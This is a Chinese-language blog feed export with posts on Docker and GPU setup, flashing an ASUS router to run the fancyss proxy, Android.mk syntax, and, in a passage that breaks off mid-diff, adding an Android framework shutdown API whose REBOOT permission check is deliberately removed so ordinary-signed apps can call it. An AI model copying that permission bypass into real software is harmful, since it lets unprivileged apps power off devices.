    <url>/2023/11/05/Docker%E5%AE%89%E8%A3%85+%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="docker安装-显卡支持"><a href="#docker安装-显卡支持" class="headerlink" title="docker安装+显卡支持"></a>docker安装+显卡支持</h1><p>教程地址：<a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p><ul><li><p>删除旧版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure></li><li><p>添加GPG秘钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="line">echo \</span><br><span class="line">  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">  $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure></li><li><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure></li><li><p>服务启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure></li><li><p>开机自启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable docker.service</span><br></pre></td></tr></table></figure></li></ul><h2 id="nvidia支持"><a href="#nvidia支持" class="headerlink" title="nvidia支持"></a>nvidia支持</h2><p>官方文件地址: <a href="https://github.com/NVIDIA/nvidia-docker">https://github.com/NVIDIA/nvidia-docker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">首先要确保已经安装了nvidia driver</span><br><span class="line"># 1. 添加源</span><br><span class="line">distribution=$(. /etc/os-release;echo $ID$VERSION_ID)</span><br><span class="line">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="line">curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="line"></span><br><span class="line"># 2. 安装并重启</span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><ul><li>使用</li></ul><p>主要核心的就是需要加上 –gpus all 才可以支持显卡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd --gpus all nvidia/cuda:11.0.3-base-ubuntu20.04</span><br></pre></td></tr></table></figure><p>进入容器后输入nvidia-smi 就可以看到显卡信息了</p><p>一些常用库的开源镜像地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># pytorch</span><br><span class="line">docker pull pytorch/pytorch:1.9.1-cuda11.1-cudnn8-runtime</span><br></pre></td></tr></table></figure><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><h2 id="docker-run-：创建一个新的容器并运行一个命令"><a href="#docker-run-：创建一个新的容器并运行一个命令" class="headerlink" title="docker run ：创建一个新的容器并运行一个命令"></a>docker run ：创建一个新的容器并运行一个命令</h2><p>语法<br><code>docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</code></p><p>OPTIONS说明：</p><p>-a stdin: 指定标准输入输出内容类型，可选 STDIN&#x2F;STDOUT&#x2F;STDERR 三项；</p><p>-d: 后台运行容器，并返回容器ID；</p><p>-i: 以交互模式运行容器，通常与 -t 同时使用；</p><p>-P: 随机端口映射，容器内部端口随机映射到主机的端口</p><p>-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</p><p>-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</p><p>–name&#x3D;”nginx-lb”: 为容器指定一个名称；</p><p>–dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</p><p>–dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</p><p>-h “mars”: 指定容器的hostname；</p><p>-e username&#x3D;”ritchie”: 设置环境变量；</p><p>–env-file&#x3D;[]: 从指定文件读入环境变量；</p><p>–cpuset&#x3D;”0-2” or –cpuset&#x3D;”0,1,2”: 绑定容器到指定CPU运行；</p><p>-m :设置容器使用内存最大值；</p><p>–net&#x3D;”bridge”: 指定容器的网络连接类型，支持 bridge&#x2F;host&#x2F;none&#x2F;container: 四种类型；</p><p>–link&#x3D;[]: 添加链接到另一个容器；</p><p>–expose&#x3D;[]: 开放一个端口或一组端口；</p><p>–volume , -v: 绑定一个卷</p><p>–restart , 重启策略，我一般喜欢 –restart&#x3D;always</p><h2 id="docker-logs-获取容器的日志"><a href="#docker-logs-获取容器的日志" class="headerlink" title="docker logs : 获取容器的日志"></a>docker logs : 获取容器的日志</h2><p>语法<br><code>docker logs [OPTIONS] CONTAINER</code></p><p>OPTIONS说明：</p><p>-f : 跟踪日志输出</p><p>–since :显示某个开始时间的所有日志</p><p>-t : 显示时间戳</p><p>–tail :仅列出最新N条容器日志</p><h2 id="docker-images-列出本地镜像"><a href="#docker-images-列出本地镜像" class="headerlink" title="docker images : 列出本地镜像"></a>docker images : 列出本地镜像</h2><p>语法<br><code>docker images [OPTIONS] [REPOSITORY[:TAG]]</code><br>OPTIONS说明：</p><p>-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</p><p>–digests :显示镜像的摘要信息；</p><p>-f :显示满足条件的镜像；</p><p>–format :指定返回值的模板文件；</p><p>–no-trunc :显示完整的镜像信息；</p><p>-q :只显示镜像ID。</p><h2 id="docker-ps-列出容器"><a href="#docker-ps-列出容器" class="headerlink" title="docker ps : 列出容器"></a>docker ps : 列出容器</h2><p>语法<br><code>docker ps [OPTIONS]</code><br>OPTIONS说明：</p><p>-a :显示所有的容器，包括未运行的。</p><p>-f :根据条件过滤显示的内容。</p><p>–format :指定返回值的模板文件。</p><p>-l :显示最近创建的容器。</p><p>-n :列出最近创建的n个容器。</p><p>–no-trunc :不截断输出。</p><p>-q :静默模式，只显示容器编号。</p><p>-s :显示总的文件大小。</p><h2 id="docker-exec-：在运行的容器中执行命令"><a href="#docker-exec-：在运行的容器中执行命令" class="headerlink" title="docker exec ：在运行的容器中执行命令"></a>docker exec ：在运行的容器中执行命令</h2><p>语法<br><code>docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</code></p><p>OPTIONS说明：</p><p>-d :分离模式: 在后台运行</p><p>-i :即使没有附加也保持STDIN 打开</p><p>-t :分配一个伪终端</p><h2 id="docker-kill-杀掉一个运行中的容器。"><a href="#docker-kill-杀掉一个运行中的容器。" class="headerlink" title="docker kill :杀掉一个运行中的容器。"></a>docker kill :杀掉一个运行中的容器。</h2><p>语法<br><code>docker kill [OPTIONS] CONTAINER [CONTAINER...]</code></p><p>OPTIONS说明：</p><p>-s :向容器发送一个信号</p><h2 id="docker-rm-：删除一个或多个容器。"><a href="#docker-rm-：删除一个或多个容器。" class="headerlink" title="docker rm ：删除一个或多个容器。"></a>docker rm ：删除一个或多个容器。</h2><p>语法<br><code>docker rm [OPTIONS] CONTAINER [CONTAINER...]</code></p><p>OPTIONS说明：</p><p>-f :通过 SIGKILL 信号强制删除一个运行中的容器。</p><p>-l :移除容器间的网络连接，而非容器本身。</p><p>-v :删除与容器关联的卷。</p><h1 id="Docker-四种网络模式"><a href="#Docker-四种网络模式" class="headerlink" title="Docker 四种网络模式"></a>Docker 四种网络模式</h1><ul><li>bridge模式<br>当Docker进程启动时，会在主机上创建一个名为docker0的虚拟网桥，此主机上启动的Docker容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。</li><li>host模式<br>如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。</li><li>none模式<br>使用none模式，Docker容器拥有自己的Network Namespace，但是，并不为Docker容器进行任何网络配置。也就是说，这个Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。</li><li>container模式<br>这个模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华硕路由刷固件装fancyss</title>
    <link href="/2023/11/05/%E5%8D%8E%E7%A1%95%E8%B7%AF%E7%94%B1%E5%88%B7%E5%9B%BA%E4%BB%B6%E8%A3%85fancyss/"/>
    <url>/2023/11/05/%E5%8D%8E%E7%A1%95%E8%B7%AF%E7%94%B1%E5%88%B7%E5%9B%BA%E4%BB%B6%E8%A3%85fancyss/</url>
    
    <content type="html"><![CDATA[<h2 id="华硕路由刷固件装fancyss"><a href="#华硕路由刷固件装fancyss" class="headerlink" title="华硕路由刷固件装fancyss"></a>华硕路由刷固件装fancyss</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>目的：GMS测试时需要设备都连接外网，而公司原先是没有专门连外网的路由的，所以需要买一款路由器，然后装fancyss来连接外网。</p><p>这里从买路由器开始就需要主持fancyss支持的机型，所支持机型和教程在下列文档中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hq450/fancyss_history_package</span><br></pre></td></tr></table></figure><p>上面文档感觉基本停止维护，支持的基本都是比较老的路由器，所以采购的时候需要注意一下。其他的路由器可以刷固件，但不知道fancyss是否支持，所以还是要注意文档。这里公司采购机型为：RT-AX86U PRO ，也是该工具支持的最新的几款路由器之一了。</p><h3 id="刷固件教程"><a href="#刷固件教程" class="headerlink" title="刷固件教程"></a>刷固件教程</h3><p>在KoolCenter中有路由器的官改固件和梅林改固件，这里我选择使用官改固件，下载最新版本的固件即可，下载的链接如下，这里得到的是一个pkgtb文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.koolcenter.com/fw/device/rt-ax86u_pro/asus_official</span><br></pre></td></tr></table></figure><ul><li><p>路由器接上电源，插上网线，让自己主机连上该wifi，然后再浏览器输入路由器的ip网关，我是192.168.50.1，输入路由器管理账号密码。</p></li><li><p>点击Web GUI画面上方的固件版本信息.</p></li><li><p>在固件升级页面点击 [<strong>手动固件更新：上传</strong>]，上传前面下载的pkgtb文件。</p></li><li><p>请等待进度条跑完，期间请不要关闭路由器电源.</p></li><li><p>刷机完成后需要手动重启路由器，重启后先将路由器连上网络，然后进入软件中心将软件中心更新到最新版本。</p></li></ul><h3 id="安装fancyss"><a href="#安装fancyss" class="headerlink" title="安装fancyss"></a>安装fancyss</h3><p>再最上面的github链接中可以下载到对应版本的离线插件包，我这款对应下载的是 fancyss_hnd_v8_full 这个。</p><p>插件安装方式有两种：</p><p>1、离线安装：下载完成后在软件中心内使用<strong>离线安装</strong>&#x2F;<strong>手动安装</strong>功能，选择安装包后上传并安装即可。</p><p>2、命令安装：(以fancyss_hnd_lite.tar.gz为例，先下载好安装包，并将其上传到路由器的&#x2F;tmp目录)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/fancyss_hnd_lite.tar.gz /tmp/shadowsocks.tar.gz</span><br><span class="line">tar -zxvf /tmp/shadowsocks.tar.gz</span><br><span class="line">sh /tmp/shadowsocks/install.sh</span><br></pre></td></tr></table></figure><p>安装完成后需要进行节点设置，如果是自己的代理服务器则在节点中输入服务器信息，不过一般都是用的机场，机场订阅后会发送一个http&#x2F;https链接，该链接包含多个服务器信息，在fancyss中也是支持订阅的配置的，点击订阅设置就可以了，后面根据自己需要设置代理模式、故障转移等。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Android.mk怎么写.md</title>
    <link href="/2023/11/05/Android.mk%E6%80%8E%E4%B9%88%E5%86%99.md/"/>
    <url>/2023/11/05/Android.mk%E6%80%8E%E4%B9%88%E5%86%99.md/</url>
    
    <content type="html"><![CDATA[<h2 id="0、小小的示例"><a href="#0、小小的示例" class="headerlink" title="0、小小的示例"></a>0、小小的示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line"># AIDL 文件目录</span><br><span class="line">AIDL_SRC := $(LOCAL_PATH)/aidl</span><br><span class="line"></span><br><span class="line"># Java 文件目录</span><br><span class="line">JAVA_SRC := $(LOCAL_PATH)/src</span><br><span class="line"></span><br><span class="line"># 所有的 Java 文件</span><br><span class="line">JAVA_FILES := $(wildcard $(AIDL_SRC)/*.java) $(wildcard $(JAVA_SRC)/*.java)</span><br><span class="line"></span><br><span class="line"># 构建输出的 JAR 文件</span><br><span class="line">LOCAL_MODULE := CommonApiService</span><br><span class="line">LOCAL_SRC_FILES := $(JAVA_FILES:$(LOCAL_PATH)/%=%)</span><br><span class="line">LOCAL_STATIC_JAVA_LIBRARIES := android-support</span><br><span class="line"></span><br><span class="line">include $(BUILD_STATIC_JAVA_LIBRARY)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1、指定文件"><a href="#1、指定文件" class="headerlink" title="1、指定文件"></a>1、指定文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_SRC_FILES := \</span><br><span class="line">        $(call all-java-files-under, src)</span><br></pre></td></tr></table></figure><p><code>LOCAL_SRC_FILES</code> 用于指定要编译的源代码文件。<code>$(call all-java-files-under, src)</code> 是一个 GNU Make 函数调用，用于搜索指定目录下的所有 Java 源代码文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_AIDL_INCLUDES := \</span><br><span class="line">    $(LOCAL_PATH)/aidl</span><br></pre></td></tr></table></figure><p><code>LOCAL_AIDL_INCLUDES</code> 变量用于告诉构建系统在哪里寻找 AIDL 文件，以便在构建过程中将这些 AIDL 文件编译成 Java 文件。</p><p>一般来说aidl文件放在<code>LOCAL_AIDL_INCLUDES</code> 中即可，无需额外在<code>LOCAL_SRC_FILES</code> 中添加，不过也有时候直接在<code>LOCAL_SRC_FILES</code> 添加后，也可以不用在<code>LOCAL_AIDL_INCLUDES</code> 中添加，不过两个都加进去也无妨。</p><h2 id="2、想要编译成什么结果"><a href="#2、想要编译成什么结果" class="headerlink" title="2、想要编译成什么结果"></a>2、想要编译成什么结果</h2><p>Android.mk文件可以将模块编译为：apk、jar包、二进制文件 等等，想要不同的文件，则最后一个include则变为不同的类型即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_JACK_ENABLED := disabled</span><br><span class="line">include $(BUILD_STATIC_JAVA_LIBRARY) </span><br></pre></td></tr></table></figure><p><code>include $(BUILD_STATIC_JAVA_LIBRARY)</code>：这个指令告诉构建系统根据指定的 <code>LOCAL_MODULE</code> 和 <code>LOCAL_SRC_FILES</code> 编译 Java 源代码文件，并生成静态 Java 库文件。静态 Java 库文件是一个包含 Java 类文件的 JAR 文件，可以用于在其他应用程序中引用和使用。该指令一般需要和上面这条指令一起使用，用于屏蔽Jack编译器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $(BUILD_JAVA_LIBRARY)</span><br></pre></td></tr></table></figure><p><code>include $(BUILD_JAVA_LIBRARY)</code>：这个指令类似于 <code>BUILD_STATIC_JAVA_LIBRARY</code>，但生成的是一个用于 Android 应用程序的 JAR 文件，而不仅仅是库文件。这个 JAR 文件可能包含应用程序的代码、资源和其他文件，可以用于构建 APK。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure><p><code>include $(BUILD_EXECUTABLE)</code> 告诉构建系统将模块编译为可执行文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $(BUILD_PACKAGE)</span><br></pre></td></tr></table></figure><p>将模块编译为apk文件</p><h2 id="3、权限控制"><a href="#3、权限控制" class="headerlink" title="3、权限控制"></a>3、权限控制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PRIVATE_PLATFORM_APIS := true</span><br></pre></td></tr></table></figure><p>设置该属性后，模块中的 API 会被视为私有平台 API。这意味着只有系统级别的应用程序或者使用系统签名的应用程序才能访问您的模块中的这些 API，普通的第三方应用程序将无法访问它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_CERTIFICATE := platform</span><br></pre></td></tr></table></figure><p><code>LOCAL_CERTIFICATE</code> 是一个变量，用于指定签名密钥的别名，以及要用于签署模块的证书。其中，<code>platform</code> 是一个预定义的别名，代表了 Android 平台密钥，设为它后模块将使用系统默认的签名密钥进行签名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PRIVILEGED_MODULE := true </span><br></pre></td></tr></table></figure><p><code>LOCAL_PRIVILEGED_MODULE := true</code>： 这个选项用于标识一个模块是否是特权模块。特权模块是那些需要更高权限的模块，例如系统服务、系统框架等。设置为 <code>true</code> 表示该模块被认为是特权模块，拥有更高的权限级别。</p><h2 id="4、其他常用"><a href="#4、其他常用" class="headerlink" title="4、其他常用"></a>4、其他常用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir) </span><br></pre></td></tr></table></figure><p>定义了当前 <code>Android.mk</code> 文件所在的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $(CLEAR_VARS)</span><br></pre></td></tr></table></figure><p>清除之前的变量设置，为当前模块设置新的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_MODULE := my_module</span><br></pre></td></tr></table></figure><p>定义了编译后的文件名称</p><h2 id="5、APK模块才用到的"><a href="#5、APK模块才用到的" class="headerlink" title="5、APK模块才用到的"></a>5、APK模块才用到的</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PACKAGE_NAME := com.example.myapp</span><br></pre></td></tr></table></figure><p><code>LOCAL_PACKAGE_NAME</code> 指定了 APK 的包名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_MANIFEST_FILE := AndroidManifest.xml</span><br></pre></td></tr></table></figure><p><code>LOCAL_MANIFEST_FILE</code> 指定了 AndroidManifest.xml 的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_RESOURCE_DIR := $(LOCAL_PATH)/res</span><br></pre></td></tr></table></figure><p><code>LOCAL_RESOURCE_DIR</code> 指定了资源文件的路径</p><h2 id="6、不常用"><a href="#6、不常用" class="headerlink" title="6、不常用"></a>6、不常用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_INIT_RC := rootapi_service.rc</span><br></pre></td></tr></table></figure><p>指定rc文件，一般用于二进制的模块启动设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">    libutils \</span><br><span class="line">    libbinder \</span><br><span class="line">    liblog </span><br></pre></td></tr></table></figure><p> <code>include $(BUILD_SHARED_LIBRARY)</code> 用来创建共享库模块。同时，共享库模块的名称应该与在 <code>LOCAL_SHARED_LIBRARIES</code> 中指定的名称相匹配。一般在C++的项目中用的比较多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_STATIC_JAVA_LIBRARIES := \</span><br><span class="line">        android-common \</span><br><span class="line">        libchips \</span><br><span class="line">        colorpicker \</span><br><span class="line">        android-opt-datetimepicker \</span><br><span class="line">        android-opt-timezonepicker \</span><br><span class="line">        android-support-v4 \</span><br><span class="line">        calendar-common</span><br></pre></td></tr></table></figure><p>和上面一样，只不过这次是Java的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_MODULE_TAGS := optional</span><br></pre></td></tr></table></figure><p><code>LOCAL_MODULE_TAGS</code> 是一个用于为构建模块指定标签的变量，而 <code>optional</code> 标签是用于指示某个模块是可选的。</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过AIDL提供权限接口</title>
    <link href="/2023/11/05/%E9%80%9A%E8%BF%87AIDL%E6%8F%90%E4%BE%9B%E6%9D%83%E9%99%90%E6%8E%A5%E5%8F%A3/"/>
    <url>/2023/11/05/%E9%80%9A%E8%BF%87AIDL%E6%8F%90%E4%BE%9B%E6%9D%83%E9%99%90%E6%8E%A5%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<p>需求：为客户的普通签名app提供api</p><p>在framework中添加权限API时，一般采用aidl的方式</p><h2 id="1、system权限的api"><a href="#1、system权限的api" class="headerlink" title="1、system权限的api"></a>1、system权限的api</h2><p>详细需求：提供一个shutdown的接口供客户apk调用</p><p>分析：该接口的实现方法有多种，下面将多种实现方法全部列举出</p><h3 id="方法一：通过shell指令执行关机操作"><a href="#方法一：通过shell指令执行关机操作" class="headerlink" title="方法一：通过shell指令执行关机操作"></a>方法一：通过shell指令执行关机操作</h3><p>这个方法需要执行的apk拥有system权限和REBOOT权限。这里需要的权限和下文中方法三一致，方法一的解决方法还是要看下面方法。</p><p>既然解决方法和下面一致，为什么还有单独拿出来作为方法一呢，因为有一些东西需要记录一下。</p><p>在Java代码中，是可以通过new ProcessBuilder().command(cmd).start()来执行shell指令的，执行shell指令所需要的权限和调用Android里面同样功能api所需要的权限似乎略有不同。</p><p>例如在安卓7.1中。reboot的指令在shell中任何用户都能执行，不需要权限，而如果在Android中是需要调用PowerManager类的reboot方法，这里面就会有权限校验，需要system权限和REBOOT权限才能执行reboot指令。 </p><p>虽然reboot方法可以执行，但安卓7.1的shell是没有shutdown方法的，通过adb shell进去无法执行shutdown，但是仍可以在代码中通过new ProcessBuilder().command(cmd).start()来执行shutdown，此时的shell会索要特殊权限，即上面提到的system权限和REBOOT权限。</p><blockquote><p>扩展一下为什么执行shutdown需要的是REBOOT权限，在最原始的Linux中，没有shutdown这个指令，想要关机是使用reboot -p ，安卓在设计的时候也沿用了这样的思想，只是后面发现不是所有开发者都熟悉Linux的思想，所以添加了shutdown，并将PowerManager中的shutdown设置为隐藏api，开发者一般不会用，所以给了shutdown的接口，却判断的还是reboot权限。</p></blockquote><blockquote><p>再扩展一下shutdown，其实shutdown的执行有两种方法，一种是上面说的PowerManager，是调用隐藏的api，判断的是reboot权限。</p><p>另一种是通过intent去关机，使用intent的话需要申请<uses-permission android:name="android.permission.REBOOT" />，然后会跳转到com.android.internal.app.ShutdownActivity这个activity，这样才有权限继续往下执行。这里判断的就是shutdown了</p></blockquote><p><img src="/upload/image-20230828170403276.png" alt="image-20230828170403276"></p><p>查看shell指令的权限：adb shell ，然后cd &#x2F;system&#x2F;bin ，最后通过ls -l就可以看到所有shell指令所需要的权限了</p><h3 id="方法二：修改PowerManager，新增一个接口跳过权限校验"><a href="#方法二：修改PowerManager，新增一个接口跳过权限校验" class="headerlink" title="方法二：修改PowerManager，新增一个接口跳过权限校验"></a>方法二：修改PowerManager，新增一个接口跳过权限校验</h3><p>首先简单分析一下PowerManager的调用顺序</p><p>PowerManager是通过SystemServiceRegistry类注册到了系统中，任何APP都可以通过context.getSystemService()方法来得到PowerManager，在PowerManager创建的时候，会注入一个IPowerManager</p><p>IPowerManager这个服务，通过SystemService.add注册到系统中，它的实现是PowerManagerService</p><p>PowerManagerService继承于SystemService并通过mSystemServiceManager.startService(PowerManagerService.class);启动</p><p>现在新增一个接口，具体的做法是要在IPowerManager中新增，这个类里新增就是要修改IPowerManager.aidl文件，还有一个cpp文件和一个.h文件，具体是哪个c文件在IPowerManager.aidl的注释中是写清楚了的。</p><p>在aidl中新增之后，就要去PowerManagerService里面实现，aidl的实现在PowerManagerService里面的一个内部类中，不过也不难找到   private final class BinderService extends IPowerManager.Stub {} 就是这个内部类。</p><p>找到之后先实现自己的shutdown方法，把权限校验那一行删掉就行了，就是这行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mContext.enforceCallingOrSelfPermission(android.Manifest.permission.REBOOT, null);</span><br></pre></td></tr></table></figure><p>具体的代码像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/os/PowerManager.java b/core/java/android/os/PowerManager.java</span><br><span class="line">index 5514e61207a..d72a709e737 100644</span><br><span class="line">--- a/core/java/android/os/PowerManager.java</span><br><span class="line">+++ b/core/java/android/os/PowerManager.java</span><br><span class="line">@@ -1126,6 +1126,19 @@ 